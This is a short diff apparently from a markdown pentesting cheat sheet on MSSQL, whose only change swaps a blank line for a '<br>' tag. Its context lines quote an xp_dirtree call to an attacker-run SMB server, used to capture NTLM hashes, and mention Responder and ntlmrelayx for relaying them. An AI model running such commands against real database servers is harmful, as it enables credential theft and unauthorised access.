@@ -40,7 +40,7 @@ Inside mssqlclient.py session: `xp_dirtree \\<your_smbserver_ip>\whatever`
 
 For NTLM relay look for "responder" and "ntlmrelayx" functionalitys.
 
-
+<br>
 
 ### Database enumeration:
 
